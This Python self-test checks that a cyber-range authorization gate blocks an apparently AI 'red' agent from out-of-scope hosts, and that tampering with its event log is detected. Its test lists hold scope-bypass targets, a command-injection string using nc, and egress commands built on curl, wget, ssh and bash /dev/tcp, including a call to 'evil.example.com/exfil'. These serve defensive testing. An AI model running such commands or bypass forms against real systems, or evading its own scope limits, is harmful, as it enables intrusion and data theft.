#!/usr/bin/env python3
"""Adversarial self-test of the authorization gate (brief §7).

States the safety guarantee as a near-theorem backed by attempts: try to slip an
out-of-scope action past the gate via EVERY addressing form a red agent might use
(hostname, alias, host:port, URL, raw container IP, case games, encoded host), and
prove each is blocked BEFORE the tool function runs. Then corrupt a committed log
line and prove verify() catches it.

  python scripts/redteam_gate.py      # exits non-zero if any attempt slips through
"""
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swarm.gate import Gate, OutOfScope
from swarm.eventlog import EventLog


class _Rec:
    def __init__(self): self.events = []
    def append(self, actor, action, data=None): self.events.append((action, data)); return {}


# Out-of-scope target 'decoy' addressed every way red might try it.
OOS_FORMS = [
    ("hostname", "decoy"),
    ("alias", "range-decoy"),
    ("host:port", "decoy:8080"),
    ("url", "http://decoy:8080/health"),
    ("uppercase", "DECOY"),
    ("fqdn", "decoy.range.local"),
    ("raw-ip", "172.20.0.99"),
    ("encoded", "%64ecoy"),
    ("trailing-dot", "decoy."),
]
# In-scope targets that MUST still work (no false denials).
IN_SCOPE_FORMS = [("name", "struts"), ("alias", "range-struts"), ("host:port", "struts:8080")]

# A1 regression (permanent): strict target parsing. 'web01' is in scope, 'dc-01'
# (10.50.0.11) is forbidden; aliases map the container IP and the range- name. Every
# form below MUST be blocked — the userinfo/separator confusion whose split(':')[0] is
# the in-scope 'web01' (G1), a shell-injection target (G2), and decimal/hex/short/octal/
# IPv6-mapped spellings of the forbidden IP. These are the exact bypasses the 2026-11-06
# audit reproduced; this list is their frozen regression.
A1_SCOPE = ["web01", "db"]
A1_ALIASES = {"10.50.0.10": "web01", "10.50.0.11": "dc-01",
              "range-web01": "web01", "range-dc-01": "dc-01"}
CONFUSION_FORMS = [
    ("userinfo-name", "web01:22@10.50.0.11"),
    ("userinfo-ip", "10.50.0.10:80@10.50.0.11"),
    ("userinfo-forbidden", "web01:x@dc-01"),
    ("userinfo-range", "range-web01:1@10.50.0.11"),
    ("space-split", "web01:22 10.50.0.11"),
    ("empty-port-at", "web01:@dc-01"),
    ("at-plain", "web01@10.50.0.11"),
    ("path-traversal", "range-web01/../dc-01"),
    ("hash-at", "web01#@10.50.0.11"),
    ("injection", "web01:22;nc -z 10.50.0.11 22;#"),
    ("url-userinfo", "http://web01@10.50.0.11/"),
    ("decimal-ip", "171048971"),
    ("hex-ip", "0xa32000b"),
    ("short-ip", "10.50.11"),
    ("octal-ip", "012.062.0.013"),
    ("ipv6-mapped", "::ffff:10.50.0.11"),
    ("ipv6-mapped-bracket", "[::ffff:10.50.0.11]"),
    ("crafted-prefix", "XXXXXXweb01"),
    ("cidr", "10.50.0.11/32"),
]

# P0: free-form commands on an IN-SCOPE host (struts) that egress to an
# OUT-OF-SCOPE host (decoy/ldap/mail) addressed every way — each must be blocked
# BEFORE the command runs, no matter how it's phrased.
EGRESS_BYPASS = [
    ("url", "curl http://decoy:8080/x"),
    ("bare-host", "wget ldap/creds"),
    ("host:port", "curl mailserver:25"),
    ("dev-tcp", "bash -c 'cat </dev/tcp/decoy/80'"),
    ("netcat", "nc ldap 389"),
    ("ssh", "ssh admin@mailserver"),
    ("raw-ip", "curl http://172.20.0.99/"),
    ("open-internet", "curl https://evil.example.com/exfil"),
]
# Free-form commands that stay in scope / in-host — must NOT be falsely denied.
# The flagged forms guard the fix for flag ARGUMENTS mis-split as hostnames:
# `-X POST` -> "post", `-o BatchMode=yes` -> "batchmode" must not be blocked.
EGRESS_OK = ["id", "uname -a", "cat /etc/passwd", "psql -h db -U app -c 'select 1'",
             "curl http://struts:8080/health",
             'curl -s -X POST http://struts:8080/x --data-urlencode "s=1"',
             "ssh -o BatchMode=yes -o ConnectTimeout=5 root@db id",
             'curl -H "X-Foo: bar" http://struts:8080/health']


def prove():
    scope = ["struts", "db"]
    slipped, false_denied = [], []

    # 1. Every out-of-scope addressing form is blocked before the tool runs.
    for label, target in OOS_FORMS:
        log = _Rec()
        gate = Gate(scope, log)
        ran = []
        try:
            gate.dispatch("red", "nmap", target, lambda: ran.append(target) or "ran")
            slipped.append((label, target, "dispatch did not raise"))
        except OutOfScope:
            if ran:
                slipped.append((label, target, "tool executed despite block"))
        if gate.allows(target):
            slipped.append((label, target, "allows() returned True"))

    # 2. In-scope targets still work (the gate is not just "deny all").
    for label, target in IN_SCOPE_FORMS:
        log = _Rec()
        gate = Gate(scope, log)
        ran = []
        try:
            gate.dispatch("red", "nmap", target, lambda: ran.append(target) or "ran")
            if not ran:
                false_denied.append((label, target, "tool did not run"))
        except OutOfScope:
            false_denied.append((label, target, "in-scope target was blocked"))

    # 1c. A1: strict target parsing — every confusion/injection/alt-spelling blocked,
    #     and allows() false for each. The text that used to resolve to the in-scope
    #     'web01' via split(':')[0] is now rejected as malformed or out-of-scope.
    for label, target in CONFUSION_FORMS:
        log = _Rec()
        gate = Gate(A1_SCOPE, log)
        gate.aliases.update(A1_ALIASES)
        ran = []
        try:
            gate.dispatch("red", "fingerprint", target, lambda: ran.append(target) or "ran")
            slipped.append((f"confusion:{label}", target, "dispatch did not raise"))
        except OutOfScope:
            if ran:
                slipped.append((f"confusion:{label}", target, "tool executed despite block"))
        if gate.allows(target, "red"):
            slipped.append((f"confusion:{label}", target, "allows() returned True"))

    # 2b. P0 egress-boundary: a free-form command on in-scope struts that reaches
    #     an out-of-scope host must be blocked before it runs; in-scope egress is fine.
    for label, cmd in EGRESS_BYPASS:
        log = _Rec()
        # known_hosts = the range's OUT-OF-SCOPE host names (from topology), so the egress
        # parser recognizes them as real hosts to police — range-agnostic, not hardcoded in gate.py.
        gate = Gate(scope, log, known_hosts=["decoy", "ldap", "mailserver"])
        ran = []
        try:
            gate.dispatch("red", "exploit", "struts", lambda: ran.append(cmd) or "ran",
                          meta={"attack": "T1190"}, command=cmd)
            slipped.append((f"egress:{label}", cmd, "dispatch did not raise"))
        except OutOfScope:
            if ran:
                slipped.append((f"egress:{label}", cmd, "command executed despite block"))
    for cmd in EGRESS_OK:
        log = _Rec()
        gate = Gate(scope, log)
        ran = []
        try:
            gate.dispatch("red", "exploit", "struts", lambda: ran.append(cmd) or "ran",
                          meta={"attack": "T1190"}, command=cmd)
            if not ran:
                false_denied.append(("egress-ok", cmd, "command did not run"))
        except OutOfScope:
            false_denied.append(("egress-ok", cmd, "in-scope command was blocked"))

    # 3. The log is tamper-evident: rewrite a committed line, verify() must catch it.
    p = Path(tempfile.mkdtemp()) / "events.jsonl"
    lg = EventLog(p)
    lg.append("red", "gate.allow", {"tool": "nmap", "target": "struts"})
    lg.append("red", "shell", {"output": "root"})
    assert lg.verify() == (True, None)
    lines = p.read_text().splitlines()
    rec = json.loads(lines[0]); rec["data"]["target"] = "decoy"  # forge in-scope -> OOS
    lines[0] = json.dumps(rec, sort_keys=True)
    p.write_text("\n".join(lines) + "\n")
    tamper_caught = EventLog(p).verify()[0] is False

    return slipped, false_denied, tamper_caught


if __name__ == "__main__":
    slipped, false_denied, tamper_caught = prove()
    slipped_targets = {s[1] for s in slipped}
    n_blocked = len(OOS_FORMS) - len({t for _, t in OOS_FORMS if t in slipped_targets})
    n_egress_blocked = len(EGRESS_BYPASS) - len({c for _, c in EGRESS_BYPASS if c in slipped_targets})
    n_false = len(false_denied)
    n_confusion_blocked = len(CONFUSION_FORMS) - len({t for _, t in CONFUSION_FORMS if t in slipped_targets})
    print(f"Out-of-scope attempts blocked:   {n_blocked}/{len(OOS_FORMS)} addressing forms")
    print(f"A1 target-parse bypasses blocked:{n_confusion_blocked:>4}/{len(CONFUSION_FORMS)} (G1/G2 confusion + alt IP spellings)")
    print(f"Egress-bypass commands blocked:  {n_egress_blocked}/{len(EGRESS_BYPASS)} (P0, free-form shell)")
    print(f"In-scope / in-host allowed:      {len(IN_SCOPE_FORMS) + len(EGRESS_OK) - n_false}/{len(IN_SCOPE_FORMS) + len(EGRESS_OK)}")
    print(f"Log tamper detected by verify(): {'yes' if tamper_caught else 'NO'}")
    if slipped or false_denied or not tamper_caught:
        for s in slipped:
            print(f"  SLIPPED THROUGH: {s}")
        for f in false_denied:
            print(f"  FALSELY DENIED:  {f}")
        if not tamper_caught:
            print("  TAMPER NOT DETECTED")
        print("\nGATE INVARIANT VIOLATED")
        sys.exit(1)
    print("\nGATE INVARIANT PROVEN: no out-of-scope action executes, in-scope unaffected, log tamper-evident")
